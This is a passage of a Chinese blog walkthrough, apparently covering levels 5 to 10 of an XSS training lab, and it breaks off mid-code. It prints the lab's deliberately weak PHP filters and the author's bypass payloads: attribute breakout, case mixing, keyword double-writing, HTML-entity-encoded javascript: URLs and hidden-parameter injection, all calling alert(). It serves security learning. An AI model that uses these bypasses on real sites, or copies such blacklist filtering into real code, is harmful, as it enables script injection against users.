+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和finish<span class="hljs-symbol">&amp;quot;</span> onfocus=javascript:alert(&#x27;xss&#x27;) <span class="hljs-symbol">&amp;quot;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;finish&quot;</span> <span class="hljs-attr">o_nfocus</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) &quot;&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:42<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+<p>onfocus 里 on 变成 o_n 了。<br>onfocus<br>去docker里看了一眼源码：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level5&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>依旧没有转义input里的str，那尝试构造：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a href=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>成功</p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>可以通过大小写绕过on和er的转义：<br>payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot; &gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>HIHI<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;&#x27;<br></code></pre></td></tr></table></figure>
+
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>随便填个payload，然后查看页面源码。  </p>
+<p>发现这次是直接吧关键词过滤了，大小写绕不过了；   </p>
+<p>联想到sql注入类似的场景，双写试一下？  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a hrhrefef=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>成功了，但是点击不了，换一条payload看看呢：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; oonnfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure>
+<p>成功！  </p>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这里多了个添加友情连接，大概就是输入插入里面，源码看一下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level9.php?keyword=not bad!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level8&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level8.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;finish&amp;quot; oonnfocus=javascript:alert(&#x27;xss&#x27;) &amp;quot;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;finish&amp;quot oo_nnfocus=javascr_ipt:alert(&#x27;xss&#x27;) &amp;quot&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:53&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>强制转化为小写并且全部转义。。。    </p>
+<p>忍不住看来网上的wp，说是href会自动编译自己链接里的unioncode，  </p>
+<p>但🈶又问了一下ai：  </p>
+<p><strong>在 HTML 中，href 属性本身不会“编译” Unicode，但浏览器在解析 HTML 和处理 URL 时，会按照标准对 Unicode 字符进行编码和解码。这可能会让你产生“自动编译”的错觉。</strong></p>
+<p>然后🈶又找了一下，发现并不是浏览器解析unioncode的原因，是href会解析html实体的原因  </p>
+<p>能通过将payload编译为html的十进制或十六进制实体来进行绕过：   </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure>
+<p>这段在赛博厨子里自动识别为：HTML Entity<br>所以说并不是unioncode</p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>上一关的payload就直接被band了。。。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level10.php?keyword=well done!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level9.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#41;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:101&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>只能去看源码了吗  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level10.php?keyword=well done!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>我们必须让输入包含 http:&#x2F;&#x2F;，否则不会把我们的输入插入到 href 中！  </p>
+<p>这样的话，使用内联注释付 &#x2F;**&#x2F;,在sql中也常用作空格绕过<br>payload:  </p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/*http://*/</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这关的注入点在url上<br>看网上wp，有其他传参参数？  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level10&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<p>“t_sort”就过滤了尖括号而已，还是上网找了答案：</p>
+<p>playlaod:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure>
+
+<p>这样源码就变成了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level11.php?keyword=good 